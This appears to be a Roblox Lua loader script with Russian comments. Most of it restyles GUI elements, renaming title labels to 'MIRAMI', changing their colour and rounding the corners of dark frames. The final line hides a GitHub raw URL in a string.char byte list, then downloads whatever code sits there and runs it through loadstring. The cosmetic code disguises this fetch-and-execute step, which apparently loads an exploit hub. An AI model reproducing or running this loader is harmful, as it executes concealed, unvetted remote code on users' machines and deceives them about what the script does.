
--[[ STAGE 2: VISUAL CORE ]]
local HubName = "MIRAMI"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            -- 1. Только ГЛАВНЫЕ ЗАГОЛОВКИ (Фильтр по размеру и имени)
            if obj:IsA("TextLabel") then
                -- Если шрифт большой (заголовок) или в имени есть Title/Header
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    -- Не меняем цифры и мелкий текст
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            
            -- 2. Скругления и цвета (для красоты)
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then -- Только темные элементы
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end
    
    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then task.delay(0.1, function() Customize(c) end) end
    end)
end

Hook()
loadstring(game:HttpGet(string.char(104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 112, 108, 52, 121, 56, 48, 121, 116, 116, 45, 97, 49, 49, 121, 47, 86, 111, 105, 100, 72, 117, 98, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47, 99, 111, 118, 101, 116)))()
